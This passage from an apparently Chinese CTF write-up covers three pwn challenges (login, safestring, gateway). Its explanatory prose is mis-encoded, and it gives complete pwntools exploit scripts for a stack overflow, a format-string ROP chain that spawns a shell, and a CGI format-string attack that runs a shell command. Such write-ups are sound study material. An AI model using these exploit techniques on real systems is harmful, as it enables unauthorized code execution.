</span></span></code></pre></td></tr></table></div></div><h2 id=login>login</h2><p><img src=https://s2.loli.net/2024/06/23/oM3jPv1FAex4m82.png alt=image-20240623141533130></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯è¾“å…¥å¯†ç ï¼Œä¸€ä¸ªæ˜¯è¾“å‡ºè¾“å…¥çš„å¯†ç </p><p><img src=https://s2.loli.net/2024/06/23/M8rkFblsyUBPenX.png alt=image-20240623141617033></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªreadï¼Œè€Œä¸”æ˜¯è¯»åˆ°æ ˆä¸Šå¹¶ä¸”é•¿åº¦æ˜¯å˜é‡ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å¯†ç ï¼Œå‰ææ˜¯ç»•è¿‡æ ¡éªŒ</p><p><img src=https://s2.loli.net/2024/06/23/FB2QEGLtXRhgSDP.png alt=image-20240623141652666></p><p>æ ¡éªŒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œæ˜¯ä»ä¸€ä¸ªéšæœºæ–‡ä»¶è¯»å‡ºæ¥çš„ï¼Œä¸€å¼€å§‹æƒ³ç€çˆ†ç ´ï¼Œç»“æœè¿œç¨‹çˆ†ç ´çš„æ—¶å€™å‘ç°åˆ°åé¢å±…ç„¶æ˜¯openerrorï¼Œé‚£ä¹ˆå¯†ç ä¹Ÿå°±æ˜¯-1äº†ï¼Œæ‰€ä»¥ç›´æ¥æ ˆæº¢å‡ºåé—¨ä¸€æŠŠå—¦</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>time</span> <span class=n>import</span><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#p=process(&#39;./main&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;173.30.16.213&#39;</span><span class=p>,</span><span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#sleep(5)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;ch:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>turn</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=c1>#print(&#39;turn:&#39;,turn)</span>
</span></span><span class=line><span class=cl>	<span class=n>turn</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>	<span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;passwd:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>pos</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=n>pos</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;success&#39;</span> <span class=ow>in</span> <span class=n>pos</span> <span class=ow>or</span> <span class=sa>b</span><span class=s1>&#39;open&#39;</span> <span class=ow>in</span> <span class=n>pos</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x26</span><span class=o>+</span><span class=mi>4</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x08049e35</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=safestring>safestring</h2><p><img src=https://s2.loli.net/2024/06/23/2rKfDmujki89aGb.png alt=image-20240623141843775></p><p>èœå•ä¸‰ä¸ªåŠŸèƒ½ï¼ŒåŠ å¯†ã€è§£å¯†ã€è¾“å‡ºï¼Œè¾“å‡ºçš„æ—¶å€™æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶ååŠ å¯†å’Œè§£å¯†ä¸€ä¸ªæ˜¯å¤§å°å†™å­—æ¯+3ä¸€ä¸ª-3</p><p>æ‰€ä»¥å°±æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ï¼Œç„¶åç›´æ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™åŠ«æŒæ ˆè¿”å›åœ°å€ï¼Œå› ä¸ºå­—ç¬¦ä¸²é•¿åº¦ä¸è¶…è¿‡31ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ†å¤šæ¬¡æ‰“ï¼Œç›´æ¥æ”¹mainçš„è¿”å›åœ°å€ï¼Œç„¶åç”¨åŠŸèƒ½4returnè§¦å‘å°±è¡Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#p=process(&#39;./main&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#sleep(5)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;173.30.16.120&#39;</span><span class=p>,</span><span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>deal</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>		<span class=n>x</span><span class=o>=</span><span class=nb>ord</span><span class=p>(</span><span class=n>content</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=n>x</span><span class=o>&gt;=</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=ow>and</span> <span class=n>x</span><span class=o>&lt;=</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;z&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>			<span class=n>x</span><span class=o>=</span><span class=n>x</span><span class=o>-</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>x</span><span class=o>&lt;</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>				<span class=n>x</span><span class=o>+=</span><span class=mi>26</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=n>x</span><span class=o>&gt;=</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)</span> <span class=ow>and</span> <span class=n>x</span><span class=o>&lt;=</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;Z&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>			<span class=n>x</span><span class=o>=</span><span class=n>x</span><span class=o>-</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>x</span><span class=o>&lt;</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>				<span class=n>x</span><span class=o>+=</span><span class=mi>26</span>
</span></span><span class=line><span class=cl>		<span class=n>content</span><span class=o>=</span><span class=n>content</span><span class=p>[:</span><span class=n>i</span><span class=p>]</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=n>x</span><span class=p>)</span><span class=o>+</span><span class=n>content</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>content</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>vuln</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=o>=</span><span class=n>deal</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;input text:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>done</span><span class=p>(</span><span class=n>aim</span><span class=p>,</span><span class=n>value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=o>=</span><span class=s1>&#39;%&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>value</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;c&#39;</span><span class=o>+</span><span class=s1>&#39;%14$hhnaaaa&#39;</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=o>=</span><span class=n>content</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>tmp</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>tmp</span><span class=o>=</span><span class=n>tmp</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=n>aim</span><span class=o>%</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>aim</span><span class=o>=</span><span class=n>aim</span><span class=o>//</span><span class=mh>0x100</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=o>=</span><span class=n>content</span><span class=o>+</span><span class=n>tmp</span>
</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=o>=</span><span class=n>deal</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;input text:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>attack</span><span class=p>(</span><span class=n>aim</span><span class=p>,</span><span class=n>value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=nb>hex</span><span class=p>(</span><span class=n>aim</span><span class=p>),</span><span class=nb>hex</span><span class=p>(</span><span class=n>value</span><span class=p>))</span>
</span></span><span class=line><span class=cl>		<span class=n>done</span><span class=p>(</span><span class=n>aim</span><span class=p>,</span><span class=n>value</span><span class=o>%</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>aim</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>		<span class=n>value</span><span class=o>=</span><span class=n>value</span><span class=o>//</span><span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=c1># libc 3</span>
</span></span><span class=line><span class=cl><span class=c1># stack 6</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s1>&#39;%19$p&#39;</span>
</span></span><span class=line><span class=cl><span class=n>vuln</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;text result: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=mi>2</span><span class=p>:],</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x24083</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;libc_base:&#39;</span><span class=p>,</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s1>&#39;%7$p&#39;</span>
</span></span><span class=line><span class=cl><span class=n>vuln</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;text result: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=mi>2</span><span class=p>:],</span><span class=mi>16</span><span class=p>)</span><span class=o>+</span><span class=mh>0x38</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;stack:&#39;</span><span class=p>,</span><span class=nb>hex</span><span class=p>(</span><span class=n>stack</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s1>&#39;%9$p&#39;</span>
</span></span><span class=line><span class=cl><span class=n>vuln</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;text result: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bss</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=mi>2</span><span class=p>:],</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x1616</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;bss:&#39;</span><span class=p>,</span><span class=nb>hex</span><span class=p>(</span><span class=n>bss</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x52290</span>
</span></span><span class=line><span class=cl><span class=n>binsh</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;system:&#39;</span><span class=p>,</span><span class=nb>hex</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;binsh:&#39;</span><span class=p>,</span><span class=nb>hex</span><span class=p>(</span><span class=n>binsh</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span><span class=o>=</span><span class=n>bss</span><span class=o>+</span><span class=mh>0x16b3</span>
</span></span><span class=line><span class=cl><span class=n>ret</span><span class=o>=</span><span class=n>bss</span><span class=o>+</span><span class=mh>0x1645</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;pop rdi:&#39;</span><span class=p>,</span><span class=nb>hex</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>attack</span><span class=p>(</span><span class=n>stack</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>attack</span><span class=p>(</span><span class=n>stack</span><span class=o>+</span><span class=mh>0x18</span><span class=p>,</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>attack</span><span class=p>(</span><span class=n>stack</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>attack</span><span class=p>(</span><span class=n>stack</span><span class=p>,</span><span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=gateway>gateway</h2><p>æ„é€ åŒ…æ¯”è¾ƒéº»çƒ¦ï¼Œé¦–å…ˆæ ¹æ®é¢˜æ„æ„é€ å¥½<code>request_method</code>ï¼Œ<code>query_string</code>å’Œ<code>script_name</code>ï¼Œã€‚</p><p>æ³¨æ„åˆ°<code>auth</code>å‡½æ•°å‰é¢æœ‰ä¸€ä¸ª<code>URL</code>è§£ç ï¼Œå› æ­¤è¿˜éœ€è¦é¢å¤–ç¼–ç ä¸€æ¬¡ã€‚</p><p>éšåæœ‰ä¸€ä¸ª<code>add</code>ã€<code>delete</code>ã€<code>edit</code>çš„ç±»ä¼¼èœå•å †çš„äº¤äº’ï¼Œä½†æ˜¯æ²¡æœ‰æ¼æ´ã€‚æ¼æ´ç‚¹åœ¨äºå¦‚ä¸‹éƒ¨åˆ†ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>snprintf</span><span class=p>(</span><span class=n>parsed_content</span><span class=p>,</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=n>v6</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>è€Œ<code>snprintf</code>çš„å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>snprintf</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>maxlen</span><span class=p>,</span> <span class=n>format</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>å¯è§<code>snprintf</code>å‡½æ•°çš„è¯¯ç”¨ä½¿å¾—æ­¤å¤„å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºå’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä»»æ„åˆ©ç”¨ã€‚</p><p>è€Œæœ¬é¢˜å¼€å¯äº†<code>canary</code>ï¼Œä¸”æ— <code>leak</code>çš„æ–¹æ³•ï¼Œå› æ­¤é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹<code>puts</code>å‡½æ•°çš„<code>got</code>è¡¨ä¸º<code>system</code>ï¼Œéšåå³å¯é€šè¿‡ç¨‹åºä¸­çš„æ‰“å°å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>è€Œ<code>nginx</code>é…ç½®ä¸­<code>get_flag</code>è·¯ç”±å³å¯è®¿é—®<code>/tmp/flag</code>ï¼Œå› æ­¤æ‰§è¡Œ<code>cp /flag /tmp</code>ï¼Œå³å¯é€šè¿‡<code>get_flag</code>è·¯ç”±è·å–<code>flag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=s1>&#39;80&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;cp /flag /tmp&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=n>code</span> <span class=o>+</span> <span class=s1>&#39;;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=n>code</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>30</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>ip</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>port</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>=</span> <span class=s2>&#34;GET /cgi-bin/note_handle%2572?action=add,print,get_flag&amp;content=</span><span class=si>{}</span><span class=s2>\(@@%30$c%30$c%30$c%30$c%30$c</span><span class=si>%136c</span><span class=s2>%14$hhn HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;Host: 192.168.228.21</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;X-Forwarded-For: 127.0.0.1</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;Accept-Encoding: gzip, deflate, br</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;Accept-Language: zh-CN,zh;q=0.9</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;Connection: close</span><span class=se>\r\n</span><span class=s2>&#34;</span>
